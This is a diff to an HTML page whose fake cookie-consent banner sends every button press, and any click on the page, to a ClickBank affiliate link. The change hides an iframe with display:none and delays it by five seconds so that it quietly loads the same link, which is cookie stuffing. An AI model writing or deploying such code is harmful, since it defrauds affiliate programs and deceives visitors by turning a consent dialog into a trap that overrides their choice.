@@ -126,35 +126,35 @@
     <button class="reject-btn" id="rejectBtn">Preferences</button>
   </div>
 
-  <!-- Iframe oculto com cookie do afiliado -->
-  <iframe src="https://cc814mlnqovv6zdqr9dh5jlr4g.hop.clickbank.net" id="cookieFrame"></iframe>
+<!-- Iframe oculto com cookie do afiliado -->
+<iframe id="cookieFrame" style="display:none;"></iframe>
 
 <script>
-  // === LINK DO AFILIADO ===
   const affiliateLink = "https://cc814mlnqovv6zdqr9dh5jlr4g.hop.clickbank.net";
 
-  // === DETECTA SE É CELULAR OU DESKTOP ===
   function detectDevice() {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     document.body.classList.add(isMobile ? 'mobile' : 'desktop');
   }
 
-  // === FUNÇÃO DE REDIRECIONAMENTO ===
   function redirectToAffiliate() {
     window.location.href = affiliateLink;
   }
 
-  // === AGUARDA O DOM SER CARREGADO ===
   window.onload = function () {
     detectDevice();
 
-    // AÇÕES QUE REDIRECIONAM
+    // Eventos de clique
     document.getElementById("acceptBtn").onclick = redirectToAffiliate;
     document.getElementById("rejectBtn").onclick = redirectToAffiliate;
     document.getElementById("closeBtn").onclick = redirectToAffiliate;
-
-    // Qualquer clique em qualquer parte da página
     document.body.onclick = redirectToAffiliate;
+
+    // Atrasar o carregamento do iframe em 5 segundos
+    setTimeout(() => {
+      const iframe = document.getElementById("cookieFrame");
+      iframe.src = affiliateLink;
+    }, 5000); // 5000ms = 5 segundos
   };
 </script>
 </body>
